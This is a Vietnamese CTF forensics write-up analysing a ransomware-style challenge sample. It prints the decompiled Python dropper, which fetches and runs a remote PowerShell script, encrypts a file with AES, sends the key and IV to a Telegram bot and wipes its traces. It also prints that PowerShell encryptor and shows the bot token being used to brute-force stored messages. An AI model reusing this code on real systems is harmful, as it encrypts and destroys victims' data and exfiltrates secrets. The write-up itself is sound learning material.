# đây là lần đầu mình tiếp xúc với malware và bài này khá hay và mình đã phải hỏi bài khá nhiều và học được rất nhiều qua bài này 

## đây là 1 bài trên trang viblo CTF mảng Forensic
![image](https://hackmd.io/_uploads/rkEMoRBPxx.png)


đây là đề bài

khi bạn tải về sẽ nhận được file ad1, lúc đầu mình bị kẹt ở đây vì tool mình dùng không hợp lí, với file ad1 thì bạn nên dùng AccessData_FTK_Imager_4.7.1 để đọc được file này cũng như các file khác

![image](https://hackmd.io/_uploads/BJFTjRBPxl.png)

sau khi mở file bạn sẽ nhận được bản win backup của victim 

theo đề bài thì victim sẽ nhận được 1 mail nên ta sẽ tìm trong Download, Document, Desktop,...

![image](https://hackmd.io/_uploads/rJKS3CrPex.png)

và boom trong Document/outlook đã có 

sử dụng mailview để xem file này có gì 
![image](https://hackmd.io/_uploads/rJh5hCBDll.png)


ở đây ta thấy có file zip với pass là tmq123

sau khi view trong file zip trong đó có file .exe đây đích thị là malware

* check xem file đó được viết bằng gì nha 

![image](https://hackmd.io/_uploads/BJWWa0rPgl.png)


* ta thấy nó được pack lại rồi nên ta sẽ unpack để xem tiếp bên trong có gì 

ở đây có file alo.py

```
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: alo.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import requests
import subprocess
import zipfile
current_dir = os.path.dirname(os.path.abspath(__file__))
ps_script_url = 'https://raw.githubusercontent.com/TMQrX/temp/master/Qwertyu.ps1'
ps_script_path = os.path.join(current_dir, 'ps.ps1')
sdelete_zip_url = 'https://download.sysinternals.com/files/SDelete.zip'
sdelete_zip_path = os.path.join(current_dir, 'SDelete.zip')
sdelete_exe_path = os.path.join(current_dir, 'sdelete.exe')
flag_file_path = 'C:\\flag.txt'
temp_encrypt_folder = os.path.join(os.getenv('TEMP'), 'encrypt')

def download_file(url, destination):
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def extract_sdelete(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def execute_powershell_script(script_path):
    process = subprocess.run(['powershell.exe', '-File', script_path], capture_output=True, text=True)
    output = process.stdout.splitlines()
    if len(output) >= 2:
        cee = output[0].strip()
        vee = output[1].strip()
        return (cee, vee)
    return (None, None)

def send_to_telegram(key, iv, token, chat_id):
    message = f'Key: {key}\nIV: {iv}0'
    url = f'https://api.telegram.org/bot{token}0/sendMessage'
    data = {'chat_id': chat_id, 'text': message, 'protect_content': True}
    response = requests.post(url, data=data)

def securely_delete_files(ps_script_path, flag_file_path):
    if os.path.exists(ps_script_path):
        subprocess.run([sdelete_exe_path, ps_script_path], check=True)
    if os.path.exists(flag_file_path):
        subprocess.run([sdelete_exe_path, flag_file_path], check=True)

def delete_encrypt_folder(folder_path):
    if os.path.exists(folder_path):
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                move_to_recycle_bin(file_path)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                move_to_recycle_bin(dir_path)
        move_to_recycle_bin(folder_path)

def move_to_recycle_bin(item_path):
    ps_command = f'\n    $shell = New-Object -ComObject Shell.Application\n    $folder = $shell.Namespace(0xA)\n    $folder.MoveHere("{item_path}0")\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)

def empty_recycle_bin():
    ps_command = '\n    $recycleBin = New-Object -ComObject Shell.Application\n    $binFolder = $recycleBin.Namespace(0xA)\n    $items = $binFolder.Items()\n    $items | ForEach-Object { Remove-Item $_.Path -Force -Recurse }\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)

def main():
    download_file(ps_script_url, ps_script_path)
    download_file(sdelete_zip_url, sdelete_zip_path)
    extract_sdelete(sdelete_zip_path, current_dir)
    cee, vee = execute_powershell_script(ps_script_path)
    if cee and vee:
        telegram_token = '7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0'
        chat_id = '1617506446'
        send_to_telegram(cee, vee, telegram_token, chat_id)
    securely_delete_files(ps_script_path, flag_file_path)
    delete_encrypt_folder(temp_encrypt_folder)
    empty_recycle_bin()
if __name__ == '__main__':
    main()
```
### khôi phục tin nhắn 

* theo phân tích ở đây script sẽ tải file ps1 về và phần mềm xóa không khôi phục của microsoft, và sau khi tải xong  nó sẽ gửi 2 biến cee, vee vào bot telegra
* sau đó nó sẽ xóa toàn bộ những file mà script ps1 thực hiện 

cùng phân tích script này nha

```
$a = 'C:\flag.txt'

$a1 = New-Object System.Security.Cryptography.AesManaged
$a1.KeySize = 256
$a1.BlockSize = 128
$a1.GenerateKey()
$a1.GenerateIV()

$a2 = [System.Convert]::ToBase64String($a1.Key)
$a4 = [System.Convert]::ToBase64String($a1.IV)

$a5 = [System.IO.File]::ReadAllBytes($a)

$b2 = $a1.CreateEncryptor($a1.Key, $a1.IV)
$a3 = $b2.TransformFinalBlock($a5, 0, $a5.Length)

$a6 = [System.Convert]::ToBase64String($a3)

[System.IO.File]::WriteAllText($a, $a6)

Write-Output $a2
Write-Output $a4

$a7 = Join-Path ([System.IO.Path]::GetTempPath()) 'encrypt'

if (!(Test-Path $a7)) {
    New-Item -ItemType Directory -Path $a7
}

$a12 = $a7
$a11 = $a

if (!(Test-Path $a12)) {
    New-Item -ItemType Directory -Path $a12
}

$b4 = Get-Content -Path $a11 -Raw

$a10 = 1

foreach ($a13 in $b4.ToCharArray()) {
    $b1 = $a13 -replace '[\\/:"*?<>|]', '_'
    $a8 = $a10 * 111111
    $a9 = "$a8$b1.txt"
    $a = Join-Path $a12 $a9
    New-Item -ItemType File -Path $a -Force
    Set-Content -Path $a -Value 'tmq'
    
    $a10++
}


```

ở đây mình đã thay đổi các biến cho dễ đọc và phân tích hơn

* script này sẽ thực hiện đọc file flag.txt
* sau đó nó sẽ mã hóa content trong file bằng AES-256 sau đó nó sẽ in ra biến key, IV
* sau đó content trong flag được chuyển thành base64 rồi vòng lặp for đọc từng kí tự để thay vào tên file txt rồi chuyển vào thư mục tmq

ở đoạn này sẽ khá phức tạp ở chỗ con bot telegram vì biến key, IV được gửi vào con bot này

sau khi lấy được token mình sẽ xem con bot này là gì![image](https://hackmd.io/_uploads/HkbWJJUDgg.png)

bằng https://api.telegram.org/bot7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0/getme

ở đây để có thể khôi phục được tin nhắn thì ta phải tìm ra được api để con bot chịu nhả tin nhắn 

ở đây mình sẽ dùng api: copyMessage để khôi phục được tin nhắn

* đầu tiên ta sẽ nhắn tin con bot để lấy được chat_id của mình bằng link sau https://api.telegram.org/bot7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0/getUpdates
*  ![image](https://hackmd.io/_uploads/HklklkIDxx.png)
 

* sau khi đã có chat_id của mình, và chat_id của script
* api copyMessage sẽ hoạt động khi ta có 3 parameter sau: chat_id, from_chat_id, message_id
* như vậy ta chỉ còn message_id để khôi phục được đoạn tin nhắn
* ở đây mình sẽ brute-force để lấy tất cả tin nhắn

```
import requests
import time

BOT_TOKEN = "7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0"
chat_id = 7796745227
from_chat_id = 1617506446
start_id = 1
end_id = 10000

url = f"https://api.telegram.org/bot{BOT_TOKEN}/copyMessage"

for message_id in range(start_id, end_id + 1):
    payload = {
        "chat_id": chat_id,
        "from_chat_id": from_chat_id,
        "message_id": message_id
    }
    
    res = requests.post(url, data=payload)
    
    try:
        result = res.json()
    except Exception as e:
        print(f"[x] Error parsing response: {res.text}")
        continue

    if result.get("ok"):
        print(f"[+] Found message_id {message_id}")
        print(result)
    else:
        error = result.get('description', '')
        print(f"[-] {message_id} failed: {error}")
        
        # Nếu bị Telegram limit
        if "Too Many Requests" in error:
            print("[!] Rate limited. Sleeping 5s...")
            time.sleep(5)
        elif "retry after" in error.lower():
            retry_sec = int(error.split()[-1])
            print(f"[!] Retry after {retry_sec}s...")
            time.sleep(retry_sec)
    
    time.sleep(0.005)  # thử giảm xuống 5ms

```

sau khi chạy nó sẽ ra khá nhiều key

![image](https://hackmd.io/_uploads/BJL2ekLPle.png)

### tìm enc_flag

* đoạn này cần tìm trong event logs của victim theo đường dẫn Windows/System32/winevt/Logs

* ta cần chú ý đến file Security.evtx
* sử dụng EvtxCMD để dump file này ra file csv để dễ xem 
*
![image](https://hackmd.io/_uploads/HkQjZ18vgx.png)

* ta sẽ thấy có nhiều file txt được chuyển vào thư mục encrypt
* và tên của nó chính là enc_flag 
* ở đây mình trích xuất được tên của tất cả file txt được chuyển vào

```
# List dữ liệu từ tên file
data = """
1111110u
111111i
12222215
1333332b
1444443i
1555554s
1666665A
1777776Z
1888887i
1999998T
2111109Y
2222220G
222222U
23333314
24444422
2555553l
26666648
2777775E
2888886i
2999997w
3111108s
3222219X
33333301
333333A
34444416
3555552D
3666663X
37777744
3888885s
3999996w
41111075
4222218V
4333329L
4444440b
4444447
4555551o
4666662U
4777773_
48888845
4999995Y
51111062
5222217H
5333328O
5444439U
5555550v
555555N
5666661e
5777772+
5888883d
5999994E
6111105J
6222216n
6333327c
6444438W
6555549g
66666600
666666g
67777718
6888882k
6999993d
7111104I
777777c
888888G
999999z
""".strip().splitlines()

result = []

for line in data:
    # Ký tự cuối là ký tự flag (trước '.txt')
    char = line[-1]

    # Số đằng trước là a8 = a10 * 111111
    number_part = line[:-1]
    if number_part.isdigit():
        index = int(number_part) // 111111
        result.append((index, char))

# Sắp xếp theo chỉ số ban đầu
result.sort()

# Ghép chuỗi base64
base64_str = ''.join(char for _, char in result)
print("[+] Reconstructed base64 string:")

```

* các số tương ứng với vị trí kí tự nó sẽ được nhân cho 111111 nên các số nó cần được sắp xếp lại đúng theo thứ tự và lọc kí tự cuối của file txt để lấy enc_flag
* ta có output: 
**iUA7NgcGzu5bisAZiTYG42l8EiwsX16DX4sw5VLboU_5Y2HOUve+dEJncWg08kdI**

ta cần phải thay dấu _ bằng dấu / ở đây vì đoạn script ps1 trên có đoạn replace và theo kinh nghiệm của mình thì base64 thường chỉ có dấu / nên mình thay luôn

* như vậy ta có đủ dữ liệu để giải mã rồi, chỉ cần thử từng key và IV thôi 
* ![image](https://hackmd.io/_uploads/B1aEmk8veg.png)


và chỉ cần key, IV đầu tiên là ra flag rồi 

flag: **flag{rAnS0MWAR3_wiTH_Te1EgRam_is_FUn_r1ghT???}**

## nhận xét

tóm lại thì bài này khá stuck ở chỗ bot telegram nhưng chỉ cần tìm ra được api phù hợp, bài này ngốn của mình khoảng 5 ngày để giải được, với sự giúp sức của bạn mình :>>

Thanks for Reading this WriteUp ❤️❤️ LUV YA~
